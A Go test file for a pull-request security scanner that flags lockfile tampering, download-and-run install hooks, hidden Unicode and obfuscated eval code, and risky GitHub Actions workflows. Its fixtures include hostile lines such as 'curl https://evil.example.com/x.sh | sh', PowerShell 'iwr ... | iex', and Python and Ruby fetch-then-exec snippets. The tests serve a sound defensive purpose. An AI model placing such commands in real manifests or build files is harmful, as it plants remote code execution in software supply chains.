package pullcheck

import (
	"strings"
	"testing"
)

func TestLockfileRule(t *testing.T) {
	npm := func(resolved, integrity string) string {
		return "{\n  \"lockfileVersion\": 3,\n  \"packages\": {\n    \"node_modules/lodash\": {\n      \"version\": \"4.17.21\",\n      \"resolved\": \"" + resolved + "\",\n      \"integrity\": \"" + integrity + "\"\n    }\n  }\n}\n"
	}
	official := "https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz"
	for _, c := range []struct {
		name          string
		file          File
		registries    []string
		want          int
		title, pkg    string
		start, finish int
	}{
		{"npm from another host", File{Path: "package-lock.json", Status: "modified", Before: str(npm(official, "sha512-a")), After: str(npm("https://evil.example.com/lodash-4.17.21.tgz", "sha512-a"))}, nil, 1, "Package from an unexpected host: lodash 4.17.21", "lodash", 4, 6},
		{"npm from the team's registry", File{Path: "package-lock.json", Status: "modified", Before: str(npm(official, "sha512-a")), After: str(npm("https://npm.example.internal/lodash-4.17.21.tgz", "sha512-a"))}, []string{"https://npm.example.internal/"}, 0, "", "", 0, 0},
		{"npm from the registry", File{Path: "package-lock.json", Status: "added", After: str(npm(official, "sha512-a"))}, nil, 0, "", "", 0, 0},
		{"npm checksum changed", File{Path: "package-lock.json", Status: "modified", Before: str(npm(official, "sha512-a")), After: str(npm(official, "sha512-b"))}, nil, 1, "Checksum changed: lodash 4.17.21", "lodash", 4, 7},
		{"npm host already there", File{Path: "package-lock.json", Status: "modified", Before: str(npm("https://evil.example.com/x.tgz", "sha512-a")), After: str(npm("https://evil.example.com/x.tgz", "sha512-a"))}, nil, 0, "", "", 0, 0},
		{"yarn from another host", File{Path: "yarn.lock", Status: "added", After: str("lodash@^4.0.0:\n  version \"4.17.21\"\n  resolved \"https://evil.example.com/lodash.tgz#abc\"\n")}, nil, 1, "", "lodash", 1, 3},
		{"pnpm tarball from another host", File{Path: "pnpm-lock.yaml", Status: "added", After: str("lockfileVersion: '9.0'\npackages:\n  lodash@4.17.21:\n    resolution: {integrity: sha512-a, tarball: https://evil.example.com/lodash.tgz}\n")}, nil, 1, "", "lodash", 3, 4},
		{"pnpm checksum changed", File{Path: "pnpm-lock.yaml", Status: "modified", Before: str("packages:\n  lodash@4.17.21:\n    resolution: {integrity: sha512-a}\n"), After: str("packages:\n  lodash@4.17.21:\n    resolution: {integrity: sha512-b}\n")}, nil, 1, "Checksum changed: lodash 4.17.21", "lodash", 2, 3},
		{"cargo from another registry", File{Path: "Cargo.lock", Status: "added", After: str("[[package]]\nname = \"serde\"\nversion = \"1.0.0\"\nsource = \"registry+https://evil.example.com/index\"\nchecksum = \"aa\"\n")}, nil, 1, "", "serde", 1, 4},
		{"cargo from crates.io and git", File{Path: "Cargo.lock", Status: "added", After: str("[[package]]\nname = \"serde\"\nversion = \"1.0.0\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\n\n[[package]]\nname = \"mine\"\nversion = \"0.1.0\"\nsource = \"git+https://example.com/mine?rev=1#abc\"\n\n[[package]]\nname = \"fast\"\nversion = \"0.1.0\"\nsource = \"sparse+https://index.crates.io/\"\n")}, nil, 0, "", "", 0, 0},
		{"cargo checksum changed", File{Path: "Cargo.lock", Status: "modified", Before: str("[[package]]\nname = \"serde\"\nversion = \"1.0.0\"\nchecksum = \"aa\"\n"), After: str("[[package]]\nname = \"serde\"\nversion = \"1.0.0\"\nchecksum = \"bb\"\n")}, nil, 1, "Checksum changed: serde 1.0.0", "serde", 1, 4},
		{"composer from another host", File{Path: "composer.lock", Status: "added", After: str(`{"packages": [{"name": "a/b", "version": "1.0.0", "dist": {"url": "https://evil.example.com/b.zip", "shasum": ""}}]}`)}, nil, 1, "", "a/b", 1, 1},
		{"composer from GitHub", File{Path: "composer.lock", Status: "added", After: str(`{"packages": [{"name": "a/b", "version": "1.0.0", "dist": {"url": "https://api.github.com/repos/a/b/zipball/abc"}}]}`)}, nil, 0, "", "", 0, 0},
		{"composer branch moved", File{Path: "composer.lock", Status: "modified", Before: str(`{"packages": [{"name": "a/b", "version": "dev-main", "dist": {"url": "https://api.github.com/x", "reference": "1"}}]}`), After: str(`{"packages": [{"name": "a/b", "version": "dev-main", "dist": {"url": "https://api.github.com/x", "reference": "2"}}]}`)}, nil, 0, "", "", 0, 0},
		{"composer tag moved", File{Path: "composer.lock", Status: "modified", Before: str(`{"packages": [{"name": "a/b", "version": "1.0.0", "dist": {"url": "https://api.github.com/x", "reference": "1"}}]}`), After: str(`{"packages": [{"name": "a/b", "version": "1.0.0", "dist": {"url": "https://api.github.com/x", "reference": "2"}}]}`)}, nil, 1, "Checksum changed: a/b 1.0.0", "a/b", 1, 1},
		{"go.sum hash changed", File{Path: "go.sum", Status: "modified", Before: str("golang.org/x/text v0.3.0 h1:aaa=\n"), After: str("golang.org/x/text v0.3.0 h1:bbb=\n")}, nil, 1, "Checksum changed: golang.org/x/text v0.3.0", "golang.org/x/text", 1, 1},
		{"go.sum new module", File{Path: "go.sum", Status: "modified", Before: str("golang.org/x/text v0.3.0 h1:aaa=\n"), After: str("golang.org/x/text v0.3.0 h1:aaa=\ngolang.org/x/net v0.1.0 h1:ccc=\n")}, nil, 0, "", "", 0, 0},
		{"pipfile index", File{Path: "Pipfile.lock", Status: "added", After: str("{\n  \"_meta\": {\"sources\": [{\"url\": \"https://evil.example.com/simple\"}]},\n  \"default\": {}\n}\n")}, nil, 1, "Packages from an unexpected source: evil.example.com", "", 2, 2},
		{"pipfile hash replaced", File{Path: "Pipfile.lock", Status: "modified", Before: str(`{"default": {"requests": {"version": "==2.31.0", "hashes": ["sha256:a", "sha256:b"]}}}`), After: str(`{"default": {"requests": {"version": "==2.31.0", "hashes": ["sha256:a", "sha256:c"]}}}`)}, nil, 1, "Checksum changed: requests 2.31.0", "requests", 1, 1},
		{"pipfile hash added", File{Path: "Pipfile.lock", Status: "modified", Before: str(`{"default": {"requests": {"version": "==2.31.0", "hashes": ["sha256:a"]}}}`), After: str(`{"default": {"requests": {"version": "==2.31.0", "hashes": ["sha256:a", "sha256:c"]}}}`)}, nil, 0, "", "", 0, 0},
		{"poetry source", File{Path: "poetry.lock", Status: "added", After: str("[[package]]\nname = \"torch\"\nversion = \"2.0.0\"\nfiles = [\n    {file = \"torch.whl\", hash = \"sha256:a\"},\n]\n\n[package.source]\ntype = \"legacy\"\nurl = \"https://evil.example.com/whl\"\n")}, nil, 1, "", "torch", 1, 10},
		{"uv wheel host", File{Path: "uv.lock", Status: "added", After: str("[[package]]\nname = \"httpx\"\nversion = \"0.27.0\"\nsource = { registry = \"https://pypi.org/simple\" }\nwheels = [\n    { url = \"https://files.pythonhosted.org/h.whl\", hash = \"sha256:a\" },\n]\n")}, nil, 0, "", "", 0, 0},
		{"gemfile remote", File{Path: "Gemfile.lock", Status: "added", After: str("GEM\n  remote: https://gems.evil.example.com/\n  specs:\n    rails (7.0.0)\n")}, nil, 1, "Packages from an unexpected source: gems.evil.example.com", "", 2, 2},
		{"gemfile checksum changed", File{Path: "Gemfile.lock", Status: "modified", Before: str("GEM\n  remote: https://rubygems.org/\n\nCHECKSUMS\n  rails (7.0.0) sha256=aa\n"), After: str("GEM\n  remote: https://rubygems.org/\n\nCHECKSUMS\n  rails (7.0.0) sha256=bb\n")}, nil, 1, "Checksum changed: rails 7.0.0", "rails", 5, 5},
	} {
		t.Run(c.name, func(t *testing.T) {
			o := check(t, Input{Rules: []string{RuleLockfile}, Registries: c.registries, Files: []File{c.file}})
			got := only(o, RuleLockfile)
			if len(got) != c.want {
				t.Fatalf("findings = %+v", o.Findings)
			}
			if c.want == 0 {
				return
			}
			f := got[0]
			if c.title != "" && f.Title != c.title {
				t.Errorf("title = %q", f.Title)
			}
			if c.pkg != "" && (f.Package == nil || f.Package.Name != c.pkg) {
				t.Errorf("package = %+v", f.Package)
			}
			if f.Start != c.start || f.End != c.finish {
				t.Errorf("lines %d-%d, want %d-%d", f.Start, f.End, c.start, c.finish)
			}
			if f.Severity != "critical" || f.How == "" || f.Fix == "" {
				t.Errorf("finding = %+v", f)
			}
		})
	}
}

func TestInstallRule(t *testing.T) {
	pj := func(script string) *string {
		return str("{\n  \"name\": \"app\",\n  \"scripts\": {\n    \"build\": \"tsc\",\n    \"postinstall\": \"" + script + "\"\n  }\n}\n")
	}
	lock := func(extra string) *string {
		return str("{\n  \"lockfileVersion\": 3,\n  \"packages\": {\n    \"node_modules/esbuild\": {\n      \"version\": \"0.20.0\",\n      \"hasInstallScript\": true\n    }" + extra + "\n  }\n}\n")
	}
	for _, c := range []struct {
		name  string
		file  File
		want  int
		title string
		start int
	}{
		{"curl piped to sh", File{Path: "package.json", Status: "modified", Before: pj("node setup.js"), After: pj("curl -s https://evil.example.com/x.sh | sh")}, 1, "Install script downloads and runs code: postinstall", 5},
		{"wget then run", File{Path: "package.json", Status: "added", After: pj("wget -q https://evil.example.com/a -O /tmp/a && chmod +x /tmp/a && /tmp/a")}, 1, "", 5},
		{"node -e fetch", File{Path: "package.json", Status: "added", After: pj(`node -e \"fetch('https://evil.example.com').then(r=>r.text()).then(eval)\"`)}, 1, "", 5},
		{"powershell", File{Path: "package.json", Status: "added", After: pj("powershell -c \\\"iwr https://evil.example.com/a.ps1 | iex\\\"")}, 1, "", 5},
		{"already there", File{Path: "package.json", Status: "modified", Before: pj("curl -s https://evil.example.com/x.sh | sh"), After: pj("curl -s https://evil.example.com/x.sh | sh")}, 0, "", 0},
		{"a plain script", File{Path: "package.json", Status: "added", After: pj("node scripts/setup.js && husky install")}, 0, "", 0},
		{"patch only", File{Path: "package.json", Status: "modified", Patch: "@@ -3,3 +3,4 @@\n   \"scripts\": {\n+    \"preinstall\": \"curl https://evil.example.com/x | bash\",\n     \"build\": \"tsc\"\n"}, 1, "Install script downloads and runs code: preinstall", 4},
		{"composer", File{Path: "composer.json", Status: "added", After: str("{\n  \"scripts\": {\n    \"post-install-cmd\": [\"@php artisan key:generate\", \"curl -sL https://evil.example.com/a | php\"]\n  }\n}\n")}, 1, "Install script downloads and runs code: post-install-cmd", 3},
		{"setup.py", File{Path: "setup.py", Status: "modified", Patch: "@@ -1,2 +1,5 @@\n from setuptools import setup\n+import urllib.request\n+code = urllib.request.urlopen('https://evil.example.com/a').read()\n+exec(code)\n setup(name='x')\n"}, 1, "Build file downloads and runs code: setup.py", 2},
		{"setup.py without a download", File{Path: "setup.py", Status: "modified", Patch: "@@ -1,2 +1,3 @@\n from setuptools import setup\n+import subprocess\n setup(name='x')\n"}, 0, "", 0},
		{"build.rs", File{Path: "build.rs", Status: "added", Patch: "@@ -0,0 +1,3 @@\n+fn main() {\n+    std::process::Command::new(\"curl\").arg(\"https://evil.example.com\").status().unwrap();\n+}\n"}, 1, "", 2},
		{"extconf.rb", File{Path: "ext/x/extconf.rb", Status: "added", Patch: "@@ -0,0 +1,3 @@\n+require 'open-uri'\n+payload = URI.open('https://evil.example.com/a').read\n+system(payload)\n"}, 1, "", 1},
		{"new dependency with an install script", File{Path: "package-lock.json", Status: "modified", Before: lock(""), After: lock(",\n    \"node_modules/evil-native\": {\n      \"version\": \"1.0.0\",\n      \"hasInstallScript\": true\n    }")}, 1, "New dependency runs an install script: evil-native 1.0.0", 8},
		{"known-good install script", File{Path: "package-lock.json", Status: "added", After: lock(",\n    \"node_modules/@esbuild/darwin-arm64\": {\n      \"version\": \"0.20.0\",\n      \"hasInstallScript\": true\n    }")}, 0, "", 0},
		{"pnpm requiresBuild", File{Path: "pnpm-lock.yaml", Status: "added", After: str("packages:\n  evil-native@1.0.0:\n    resolution: {integrity: sha512-a}\n    requiresBuild: true\n  sharp@0.33.0:\n    requiresBuild: true\n")}, 1, "New dependency runs an install script: evil-native 1.0.0", 2},
	} {
		t.Run(c.name, func(t *testing.T) {
			o := check(t, Input{Rules: []string{RuleInstall}, Files: []File{c.file}})
			got := only(o, RuleInstall)
			if len(got) != c.want {
				t.Fatalf("findings = %+v", o.Findings)
			}
			if c.want == 0 {
				return
			}
			if c.title != "" && got[0].Title != c.title {
				t.Errorf("title = %q", got[0].Title)
			}
			if got[0].Start != c.start || got[0].Severity != "warning" || got[0].Conclusion != "neutral" {
				t.Errorf("finding = %+v, want line %d", got[0], c.start)
			}
		})
	}
}

func TestHiddenRule(t *testing.T) {
	b64 := strings.Repeat("aGVsbG8gd29ybGQ1", 16)
	for _, c := range []struct {
		name  string
		patch string
		want  int
		how   string
	}{
		{"zero-width space", "@@ -1,1 +1,2 @@\n const a = 1;\n+const isAdmin\u200b = false;\n", 1, "invisible characters (U+200B)"},
		{"trojan source", "@@ -0,0 +1,3 @@\n+if (access !== \"user\u202e \u2066// admin\u2069 \u2066\") {\n+  grant();\n+}\n", 1, "direction-reversing characters (U+202E, U+2066, U+2069)"},
		{"lines together are one finding", "@@ -0,0 +1,3 @@\n+a\u200b\n+b\u200b\n+c\u200b\n", 1, ""},
		{"tag characters", "@@ -0,0 +1 @@\n+// \U000E0041\U000E0042\n", 1, "U+E0041"},
		{"a run of variation selectors", "@@ -0,0 +1 @@\n+const s = '\uFE00\uFE01\uFE02\uFE03';\n", 1, ""},
		{"an emoji joined", "@@ -0,0 +1 @@\n+family: \U0001F468\u200d\U0001F469\u200d\U0001F467 and \u2764\ufe0f\n", 0, ""},
		{"a flag emoji", "@@ -0,0 +1 @@\n+flag: \U0001F3F4\U000E0067\U000E0062\U000E0065\U000E006E\U000E0067\U000E007F\n", 0, ""},
		{"a byte order mark at the start", "@@ -0,0 +1 @@\n+\ufeffname,value\n", 0, ""},
		{"a byte order mark later", "@@ -1,1 +1,2 @@\n a\n+b\ufeffc\n", 1, "U+FEFF"},
		{"a non-Latin word joined", "@@ -0,0 +1 @@\n+\u0645\u06cc\u200c\u062e\u0648\u0627\u0647\u0645\n", 0, ""},
		{"base64 run with eval", "@@ -0,0 +1,2 @@\n+const p = \"" + b64 + "\";\n+eval(atob(p));\n", 1, "eval"},
		{"base64 run without anything that runs it", "@@ -0,0 +1 @@\n+const img = \"data:image/png;base64," + b64 + "\";\n", 0, ""},
		{"hex run passed to exec", "@@ -0,0 +1 @@\n+exec(bytes.fromhex('" + strings.Repeat("6162636465", 50) + "'))\n", 1, "exec"},
		{"escapes run through Function", "@@ -0,0 +1 @@\n+new Function(\"" + strings.Repeat(`\x61`, 30) + "\")();\n", 1, "Function"},
		{"char codes and eval", "@@ -0,0 +1 @@\n+eval(String.fromCharCode(" + strings.Repeat("97,", 30) + "97));\n", 1, "eval"},
		{"regex exec is not running code", "@@ -0,0 +1,2 @@\n+const p = \"" + b64 + "\";\n+const m = /x/.exec(p);\n", 0, ""},
		{"powershell -enc", "@@ -0,0 +1 @@\n+powershell -enc " + b64 + "\n", 1, "powershell"},
		{"removed lines are not read", "@@ -1,2 +1,1 @@\n a\n-b\u200b\n", 0, ""},
	} {
		t.Run(c.name, func(t *testing.T) {
			o := check(t, Input{Rules: []string{RuleHidden}, Files: []File{{Path: "src/app.js", Status: "modified", Patch: c.patch}}})
			got := only(o, RuleHidden)
			if len(got) != c.want {
				t.Fatalf("findings = %+v", o.Findings)
			}
			if c.want == 1 && !strings.Contains(got[0].How, c.how) {
				t.Errorf("how = %q, want it to name %q", got[0].How, c.how)
			}
			if c.want == 1 && got[0].Severity != "critical" {
				t.Errorf("severity = %q", got[0].Severity)
			}
		})
	}
}

// The snippet shows invisible characters as <U+…> and masks secrets.
func TestSnippetIsSafe(t *testing.T) {
	o := check(t, Input{Rules: []string{RuleHidden}, Files: []File{{Path: "config.js", Status: "added",
		After: str("const a = 1;\nconst password = \"hunter2hunter2\";\u200b\n")}}})
	got := only(o, RuleHidden)
	if len(got) != 1 {
		t.Fatalf("findings = %+v", o.Findings)
	}
	s := got[0].Snippet
	if !strings.Contains(s, "<U+200B>") || strings.Contains(s, "hunter2") || !strings.Contains(s, "****") || got[0].Start != 2 {
		t.Errorf("snippet = %q, line %d", s, got[0].Start)
	}
	if strings.ContainsRune(s, '\u200b') {
		t.Error("the snippet carries the character itself")
	}
}

const workflowHead = "name: ci\non:\n  pull_request_target:\n    types: [opened]\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n"

func TestWorkflowRule(t *testing.T) {
	sha := strings.Repeat("a1", 20)
	for _, c := range []struct {
		name   string
		before string
		after  string
		want   []string
		line   int
	}{
		{"an unpinned action", "", workflowHead + "      - uses: tj-actions/changed-files@v45\n", []string{"Action not pinned to a commit: tj-actions/changed-files@v45"}, 9},
		{"a pinned action", "", workflowHead + "      - uses: tj-actions/changed-files@" + sha + " # v45\n", nil, 0},
		{"GitHub's own action", "", workflowHead + "      - uses: actions/setup-node@v4\n", nil, 0},
		{"a local action", "", workflowHead + "      - uses: ./.github/actions/build\n", nil, 0},
		{"an image by digest", "", workflowHead + "      - uses: docker://alpine@sha256:" + strings.Repeat("ab", 32) + "\n", nil, 0},
		{"an image by tag", "", workflowHead + "      - uses: docker://alpine:3.19\n", []string{"Action not pinned to a commit: docker://alpine:3.19"}, 9},
		{"a reusable workflow", "", "on: push\njobs:\n  call:\n    uses: someone/workflows/.github/workflows/build.yml@main\n", []string{"Action not pinned to a commit: someone/workflows/.github/workflows/build.yml@main"}, 4},
		{"already there", workflowHead + "      - uses: tj-actions/changed-files@v45\n", workflowHead + "      - run: make\n      - uses: tj-actions/changed-files@v45\n", nil, 0},
		{"pull_request_target checks out the head", "", workflowHead + "      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n      - run: npm test\n", []string{"Workflow runs pull-request code with your secrets: .github/workflows/ci.yml"}, 11},
		{"pull_request checks out the head", "", "on: pull_request\njobs:\n  t:\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n", nil, 0},
		{"pull_request_target checks out the base", "", workflowHead + "      - uses: actions/checkout@v4\n", nil, 0},
		{"workflow_run and gh pr checkout", "", "on:\n  workflow_run:\n    workflows: [ci]\njobs:\n  t:\n    steps:\n      - run: |\n          gh pr checkout 12\n          make\n", []string{"Workflow runs pull-request code with your secrets: .github/workflows/ci.yml"}, 8},
		{"the trigger changed to pull_request_target", "on: pull_request\njobs:\n  test:\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.head_ref }}\n", "on: [pull_request_target]\njobs:\n  test:\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.head_ref }}\n", []string{"Workflow runs pull-request code with your secrets: .github/workflows/ci.yml"}, 7},
		{"echo of a secret", "", workflowHead + "      - run: echo \"${{ secrets.NPM_TOKEN }}\"\n", []string{"Workflow step prints a secret: .github/workflows/ci.yml"}, 9},
		{"a secret piped to login", "", workflowHead + "      - run: echo \"${{ secrets.TOKEN }}\" | docker login -u me --password-stdin\n", nil, 0},
		{"a secret piped to base64", "", workflowHead + "      - run: echo ${{ secrets.TOKEN }} | base64\n", []string{"Workflow step prints a secret: .github/workflows/ci.yml"}, 9},
		{"a secret written to a file", "", workflowHead + "      - run: echo \"${{ secrets.TOKEN }}\" > ~/.npmrc\n", nil, 0},
		{"a secret in the step summary", "", workflowHead + "      - run: echo \"${{ secrets.TOKEN }}\" >> $GITHUB_STEP_SUMMARY\n", []string{"Workflow step prints a secret: .github/workflows/ci.yml"}, 9},
		{"a secret through env", "", workflowHead + "      - env:\n          TOKEN: ${{ secrets.TOKEN }}\n        run: |\n          make build\n          echo \"token is $TOKEN\"\n", []string{"Workflow step prints a secret: .github/workflows/ci.yml"}, 13},
		{"env dumped with a secret", "", "on: push\nenv:\n  KEY: ${{ secrets.KEY }}\njobs:\n  t:\n    steps:\n      - run: env | sort\n", []string{"Workflow step prints a secret: .github/workflows/ci.yml"}, 7},
		{"env dumped without secrets", "", "on: push\njobs:\n  t:\n    steps:\n      - run: env\n", nil, 0},
		{"set -x with a secret", "", workflowHead + "      - env:\n          KEY: ${{ secrets.KEY }}\n        run: |\n          set -x\n          deploy --key \"$KEY\"\n", []string{"Workflow step prints a secret: .github/workflows/ci.yml"}, 12},
		{"every secret at once", "", workflowHead + "      - run: echo done\n        env:\n          ALL: ${{ toJSON(secrets) }}\n", []string{"Workflow step prints a secret: .github/workflows/ci.yml"}, 11},
		{"add-mask", "", workflowHead + "      - run: echo \"::add-mask::${{ secrets.TOKEN }}\"\n", nil, 0},
	} {
		t.Run(c.name, func(t *testing.T) {
			f := File{Path: ".github/workflows/ci.yml", Status: "added", After: str(c.after)}
			if c.before != "" {
				f.Status, f.Before = "modified", str(c.before)
			}
			o := check(t, Input{Rules: []string{RuleWorkflow}, Files: []File{f}})
			got := only(o, RuleWorkflow)
			if len(got) != len(c.want) {
				t.Fatalf("findings = %+v, notes %v", o.Findings, o.Notes)
			}
			for i, w := range c.want {
				if got[i].Title != w {
					t.Errorf("title = %q, want %q", got[i].Title, w)
				}
			}
			if len(got) > 0 && (got[0].Start != c.line || got[0].Severity != "warning" || got[0].Conclusion != "neutral" || got[0].Snippet == "") {
				t.Errorf("finding = %+v, want line %d", got[0], c.line)
			}
			if len(o.Languages) != 1 || o.Languages[0] != "GitHub Actions" {
				t.Errorf("languages = %v", o.Languages)
			}
		})
	}
}

// The fix of an unpinned action says how to pin it.
func TestWorkflowWords(t *testing.T) {
	o := check(t, Input{Rules: []string{RuleWorkflow}, Files: []File{{Path: ".github/workflows/a.yaml", Status: "added", After: str(workflowHead + "      - uses: tj-actions/changed-files@v45\n")}}})
	if len(o.Findings) != 1 || o.Findings[0].Fix != "Pin it to a full commit: uses: tj-actions/changed-files@<40-character commit> # v45" {
		t.Errorf("findings = %+v", o.Findings)
	}
	// A workflow that is not YAML is a note, not a crash.
	o = check(t, Input{Rules: []string{RuleWorkflow}, Files: []File{{Path: ".github/workflows/a.yml", Status: "added", After: str("on: [push\njobs: {")}}})
	if len(o.Findings) != 0 || len(o.Notes) != 1 {
		t.Errorf("findings %+v, notes %v", o.Findings, o.Notes)
	}
}
